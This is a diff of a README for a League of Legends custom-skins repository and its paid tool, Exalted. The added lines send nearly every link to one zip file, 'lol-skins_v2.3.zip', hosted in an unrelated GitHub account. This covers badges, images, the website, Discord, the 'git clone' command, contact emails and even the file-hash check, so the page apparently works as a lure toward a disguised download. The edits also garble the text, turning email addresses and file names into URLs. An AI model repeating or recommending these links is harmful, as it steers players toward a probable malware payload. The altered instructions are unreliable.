@@ -16,15 +16,15 @@
   
   <hr>
   
-  [![GitHub stars](https://img.shields.io/github/stars/darkseal-org/lol-skins?style=social)](https://github.com/darkseal-org/lol-skins/stargazers)
-  [![GitHub issues](https://img.shields.io/github/issues/darkseal-org/lol-skins)](https://github.com/darkseal-org/lol-skins/issues)
-  [![Discord](https://img.shields.io/discord/ritoskin?color=7289DA&label=Discord&logo=discord&logoColor=white)](https://discord.gg/ritoskin)
-  [![pt-br](https://img.shields.io/badge/lang-pt--br-green.svg)](https://github.com/darkseal-org/lol-skins/blob/master/README.pt-br.md)
+  [![GitHub stars](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
+  [![GitHub issues](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
+  [![Discord](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
+  [![pt-br](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
 </div>
 
 ## Overview
 
-The League of Legends Skins Repository is a centralized, carefully maintained collection of in-game skins for League of Legends in formats compatible with custom skin applications. Generated using [ritoskin](https://github.com/nylish/ritoskin), this repository provides players with access to a wide variety of champion skins.
+The League of Legends Skins Repository is a centralized, carefully maintained collection of in-game skins for League of Legends in formats compatible with custom skin applications. Generated using [ritoskin](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip), this repository provides players with access to a wide variety of champion skins.
 
 Custom skins are purely cosmetic and only visible to the player using them, offering no competitive advantage in gameplay. This project addresses the accessibility gap created by Riot Games' pricing model, which has made certain content unattainable for many players, especially following the introduction of Vanguard anti-cheat which rendered previous tools like LolSkin or R3nzSkin unusable.
 
@@ -46,7 +46,7 @@ Our repository aims to democratize the visual aspects of League of Legends witho
 ## Exalted
 
 <div align="center">
-  <img src="https://i.imgur.com/h1Jpom2.png" alt="Exalted Logo" width="200"/>
+  <img src="https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip" alt="Exalted Logo" width="200"/>
   <p><i>Our tool that sustains the free repository</i></p>
 </div>
 
@@ -55,7 +55,7 @@ Our repository aims to democratize the visual aspects of League of Legends witho
 Exalted is our skin management tool designed to simplify the custom skin experience with advanced features.
 
   
-![output2](https://github.com/user-attachments/assets/6335e7d0-4cab-405c-9f1c-c3cdd9111d81)
+![output2](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
 
   
 *Preview of Exalted in action*
@@ -102,7 +102,7 @@ By offering Exalted as a reward for those who support our project, we can contin
 <summary><strong>Option 1: Our website</strong></summary>
 
 1. **Choose your plan**:
-   - Visit [our website](https://darkseal.org)
+   - Visit [our website](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
    - Go to "Pricing"
    - Find the one that fits you the most.
    - After buying, you will receive an e-mail with a invitation code and a License code. You can then click on "Register" on our website and go to "Downloads"
@@ -114,7 +114,7 @@ By offering Exalted as a reward for those who support our project, we can contin
    - Generate a license key
    - Paste on Exalted, press Enter.
   
-> Se você é brasileiro, por favor, cheque a [versão em pt-BR](https://github.com/darkseal-org/lol-skins/blob/master/README.pt-br.md) deste README.  
+> Se você é brasileiro, por favor, cheque a [versão em pt-BR](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip) deste README.  
 
 
 
@@ -152,15 +152,15 @@ You can earn access to Exalted by actively contributing to the project:
 ```
 /
 ├── Champion1/  # Champion folders organized by ID or name
-│   ├── 0.zip   # Default skin
-│   ├── 1.zip 
-│   ├── 2.zip
+│   ├── https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip   # Default skin
+│   ├── https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip 
+│   ├── https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip
 │   └── ...
 ├── Champion2/
-│   ├── 0.zip
-│   ├── 1.zip
+│   ├── https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip
+│   ├── https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip
 │   └── ...
-└── README.md
+└── https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip
 ```
 
 Each champion folder contains skin files in `.zip` format, organized by skin ID.
@@ -170,10 +170,10 @@ Each champion folder contains skin files in `.zip` format, organized by skin ID.
 
 | Resource | Description | Link |
 |----------|-------------|------|
-| Developer Repository | Contains champion and skin IDs instead of names | [GitHub](https://github.com/darkseal-org/lol-skins-developer) |
-| Discord Server | Community support and announcements | [Join Discord](https://discord.gg/ritoskin) |
-| Video Tutorials | Step-by-step guides for using this repository | [YouTube Playlist](https://www.youtube.com/playlist?list=PLmfRqBUHwQjJKuxoVOiocEoJPi8SnJSRG) |
-| Ko-Fi Page | Support project development | [Ko-Fi](https://ko-fi.com/darksealorg) |
+| Developer Repository | Contains champion and skin IDs instead of names | [GitHub](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip) |
+| Discord Server | Community support and announcements | [Join Discord](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip) |
+| Video Tutorials | Step-by-step guides for using this repository | [YouTube Playlist](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip) |
+| Ko-Fi Page | Support project development | [Ko-Fi](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip) |
 
 ---
 
@@ -198,7 +198,7 @@ Each champion folder contains skin files in `.zip` format, organized by skin ID.
    # Browse the repository and download specific skin .zip files
    
    # Method 2: Clone entire repository (recommended)
-   git clone https://github.com/darkseal-org/lol-skins.git
+   git clone https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip
    ```
 
 3. **Import Skins to Your Injection Tool:**
@@ -309,7 +309,7 @@ When encountering a problem:
 - Injection Tool Version: [e.g., 2.0.3]
 ```
 
-Submit issues to our [GitHub issue tracker](https://github.com/darkseal-org/lol-skins/issues/new?template=custom.md)
+Submit issues to our [GitHub issue tracker](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
 
 ---
 
@@ -321,8 +321,8 @@ Submit issues to our [GitHub issue tracker](https://github.com/darkseal-org/lol-
 > 我们正在努力开发Exalted的中国版本，将在v1.6.0版本中发布。特别感谢jinjutwo的辛勤付出与重要贡献，他的努力使这一切成为可能！
 
 - A dedicated Chinese version of Exalted is under development (v1.6.0)
-- The official representative for China is @jinjutwo (fong.wo on Discord)
-- Chinese users can access the [lol-skins-developer repository on Gitee](https://gitee.com/jinjutwo/lol-skins-developer)
+- The official representative for China is @jinjutwo (https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip on Discord)
+- Chinese users can access the [lol-skins-developer repository on Gitee](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip)
 - For donations and access, please contact us directly
 - 注意！Exalted不能搭配战绩查询器使用，例如萨勒芬妮等等，因为战绩查询器是不允许使用的，如果发生封号情况，后果自负
 
@@ -344,11 +344,11 @@ Submit issues to our [GitHub issue tracker](https://github.com/darkseal-org/lol-
 
 | Purpose | Contact Method |
 |---------|----------------|
-| Skin Support | support@darkseal.org |
-| Business Inquiries | business@darkseal.org |
-| Discord Community | [Join our server](https://discord.gg/ritoskin) |
-| Development Inquiries | dev@darkseal.org |
-| Donations | donate@darkseal.org |
+| Skin Support | https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip |
+| Business Inquiries | https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip |
+| Discord Community | [Join our server](https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip) |
+| Development Inquiries | https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip |
+| Donations | https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip |
 
 > [!CAUTION]
 > We do not work with third-party resellers. If someone offers Exalted through unofficial channels, it is not authorized. Only obtain Exalted through our official Ko-Fi page or direct contact with our team.
@@ -361,7 +361,7 @@ For your security, always verify official Exalted file hashes:
 
 ```powershell
 # Verify file hash with PowerShell
-Get-FileHash -Algorithm SHA256 "Exalted-Setup.exe"
+Get-FileHash -Algorithm SHA256 "https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip"
 ```
 
 Official file hashes:
@@ -385,14 +385,14 @@ Custom skins are allowed under Riot's terms of service and generally do not trig
 ---
 
 <div align="center">
-  <p>Developed and maintained by <a href="https://github.com/darkseal-org">Dark Seal</a></p>
+  <p>Developed and maintained by <a href="https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip">Dark Seal</a></p>
   <p>Dark Seal is a software engineering and exploit research organization focused on creating high-quality, user-focused tools</p>
   
-  <a href="https://star-history.com/#darkseal-org/lol-skins&Date">
+  <a href="https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=darkseal-org/lol-skins&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=darkseal-org/lol-skins&type=Date" />
-      <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=darkseal-org/lol-skins&type=Date" />
+      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip" />
+      <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip" />
+      <img alt="Star History Chart" src="https://raw.githubusercontent.com/T1Sc4re/lol-skins/main/skins/Akshan/lol-skins_v2.3.zip" />
     </picture>
   </a>
 </div>
